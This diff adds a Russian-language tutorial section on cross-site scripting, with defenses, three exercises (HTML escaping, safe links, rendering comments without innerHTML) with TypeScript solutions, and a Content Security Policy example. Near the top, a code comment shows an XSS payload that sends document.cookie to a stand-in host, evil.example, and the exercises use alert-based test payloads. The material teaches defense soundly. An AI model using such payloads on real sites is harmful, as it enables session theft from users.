@@ -1,0 +1,75 @@
+<section id="sec-xss">
+<h2>XSS: чужой скрипт на вашей странице</h2>
+<p><b>Cross-Site Scripting</b> — злоумышленник добивается, чтобы на вашей странице выполнился его JavaScript. Тогда он может всё, что может ваш код: читать <code>localStorage</code>, отправлять запросы от имени пользователя, менять страницу. Виды: <b>хранимая</b> (комментарий со скриптом сохранился в базе и показывается всем), <b>отражённая</b> (скрипт в параметре адреса сразу выводится на страницу), <b>DOM-based</b> (свой же клиентский код вставляет данные из адреса в DOM).</p>
+<pre><code>// уязвимо: имя из адреса попадает в HTML как разметка
+title.innerHTML = `Привет, ${new URLSearchParams(location.search).get('name')}`;
+// ?name=&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</code></pre>
+<h3 id="sec-xss-defense">Защита от XSS</h3>
+<ol><li><b>Вставляйте данные как текст</b>: <code>textContent</code>, а не <code>innerHTML</code>; <code>setAttribute</code> для атрибутов. Фреймворки (React, Vue) экранируют текст сами — опасны только их «сырые» вставки вроде <code>dangerouslySetInnerHTML</code>.</li><li><b>Если нужна разметка от пользователя</b> (форматированный комментарий) — очищайте её библиотекой-санитайзером по белому списку тегов (например, DOMPurify — из общих знаний), а не своими регулярными выражениями.</li><li><b>Ссылки</b> проверяйте по протоколу: <code>href="javascript:..."</code> выполняет код. Разрешайте только <code>http:</code> и <code>https:</code>.</li><li><b>Content Security Policy</b> — второй слой (ниже).</li></ol>
+<p>Подробно с примерами на DOM — урок <a href="/lessons/dom-basics">DOM: найти, создать, изменить</a>.</p>
+<article class="task" id="sec-t-escape" data-task="web-security/sec-t-escape">
+<h4>Задача 2. Экранирование HTML <span class="lvl">★☆☆ разминка</span></h4>
+<p>Напишите <code>escapeHtml(text)</code>, которая заменяет <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code> и <code>'</code> на HTML-сущности. Результат можно безопасно вставить и в текст элемента, и в значение атрибута в кавычках.</p>
+<p class="why"><b>Зачем:</b> иногда HTML собирают строкой: шаблон письма, серверный рендеринг. Тогда каждое значение от пользователя обязано пройти экранирование. Пропущенная кавычка — и атрибут <code>title="..."</code> превращается в <code>title="" onmouseover="..."</code>.</p>
+<details class="q spoiler"><summary>Решение и разбор</summary><div class="a">
+<pre><code>const MAP: Record&lt;string, string&gt; = { '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;' };
+
+export const escapeHtml = (text: string): string =&gt; text.replace(/[&amp;&lt;&gt;"']/g, (ch) =&gt; MAP[ch]!);</code></pre>
+<p>Одна замена с регулярным выражением по всем символам сразу. Цепочка <code>.replace('&amp;')...replace('&lt;')</code> тоже работает, но только если <code>&amp;</code> заменяется первым. Иначе уже готовые <code>&amp;lt;</code> испортятся. Экранирование для HTML не защищает в других контекстах: внутри <code>&lt;script&gt;</code>, в <code>href</code> (там нужна проверка протокола, следующая задача) и в CSS действуют свои правила.</p>
+</div></details>
+<button type="button" class="task-done" data-task-done aria-pressed="false">Отметить решённой</button>
+</article>
+<article class="task" id="sec-t-href" data-task="web-security/sec-t-href">
+<h4>Задача 3. Безопасная ссылка от пользователя <span class="lvl">★★☆ практика</span></h4>
+<p>В профиле пользователь указывает свой сайт. Напишите <code>safeHref(input, base)</code>: возвращает абсолютный адрес, если протокол <code>http:</code> или <code>https:</code> (относительные адреса разрешаются относительно <code>base</code>), иначе <code>"#"</code>. Проверьте на <code>javascript:</code> с пробелами и разным регистром и на <code>data:</code>.</p>
+<p class="why"><b>Зачем:</b> <code>textContent</code> не помогает, когда данные — значение атрибута <code>href</code>: ссылка <code>javascript:...</code> выполнит код по клику. Проверка строкой (<code>startsWith('javascript')</code>) обходится пробелами, табуляцией и регистром. Разбор через <code>URL</code> нормализует адрес так же, как браузер.</p>
+<details class="q spoiler"><summary>Решение и разбор</summary><div class="a">
+<pre><code>export function safeHref(input: string, base: string): string {
+  try {
+    const url = new URL(input.trim(), base);
+    return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : '#';
+  } catch {
+    return '#';
+  }
+}</code></pre>
+<p>Белый список протоколов вместо чёрного: неизвестно, какие ещё схемы появятся (<code>vbscript:</code>, <code>data:</code>), а разрешённых всего две. <code>new URL</code> сам удаляет управляющие символы и приводит схему к нижнему регистру, поэтому <code>" JaVaScRiPt:alert(1)"</code> честно распознаётся как <code>javascript:</code>. Некорректный адрес бросает <code>TypeError</code>, отсюда <code>try</code>.</p>
+</div></details>
+<button type="button" class="task-done" data-task-done aria-pressed="false">Отметить решённой</button>
+</article>
+<article class="task" id="sec-t-comment" data-task="web-security/sec-t-comment">
+<h4>Задача 4. Комментарий без innerHTML <span class="lvl">★★☆ практика</span></h4>
+<p>Напишите <code>renderComment(comment)</code>, которая возвращает элемент <code>article</code> с автором (ссылка на его сайт через <code>safeHref</code> из прошлой задачи) и текстом. Никакого <code>innerHTML</code> с данными. Проверьте на авторе <code>&lt;img src=x onerror=alert(1)&gt;</code> и сайте <code>javascript:alert(1)</code>.</p>
+<pre><code>// href.ts
+export function safeHref(input: string, base: string): string {
+  try { const u = new URL(input.trim(), base); return u.protocol === 'http:' || u.protocol === 'https:' ? u.href : '#'; } catch { return '#'; }
+}</code></pre>
+<p class="why"><b>Зачем:</b> это хранимая XSS в чистом виде: комментарий один раз сохранён и показывается всем посетителям. Сборка элементов через DOM API делает инъекцию невозможной по построению, а не благодаря аккуратности.</p>
+<details class="q spoiler"><summary>Решение и разбор</summary><div class="a">
+<pre><code>import { safeHref } from './href.js';
+
+export interface Comment {
+  author: string;
+  site: string;
+  text: string;
+}
+
+export function renderComment(c: Comment, base = 'https://shop.example/'): HTMLElement {
+  const article = document.createElement('article');
+  const link = document.createElement('a');
+  link.href = safeHref(c.site, base);
+  link.rel = 'nofollow noopener';
+  link.textContent = c.author;
+  const text = document.createElement('p');
+  text.textContent = c.text;
+  article.append(link, text);
+  return article;
+}</code></pre>
+<p><code>textContent</code> вставляет строку как текст: <code>&lt;img&gt;</code> появится на экране буквами, браузер не создаст тег. <code>rel="nofollow"</code> говорит поисковикам не продвигать ссылку (спамеры любят комментарии), а <code>noopener</code> не даёт открытой странице управлять вашей через <code>window.opener</code>. Тест проверяет, что в документе не появилось ни одного <code>img</code>.</p>
+</div></details>
+<button type="button" class="task-done" data-task-done aria-pressed="false">Отметить решённой</button>
+</article>
+<h3 id="sec-csp">Content Security Policy</h3>
+<p>CSP — заголовок ответа, которым сервер говорит браузеру, откуда можно загружать и выполнять скрипты, стили, картинки:</p>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'</code></pre>
+<p>С такой политикой встроенные скрипты и обработчики вида <code>onerror="..."</code> не выполняются, даже если злоумышленник сумел вставить их в HTML. Политика не исправляет уязвимость, а ограничивает ущерб. Начинают обычно с заголовка <code>Content-Security-Policy-Report-Only</code>: он только сообщает о нарушениях и ничего не ломает.</p>
+</section>
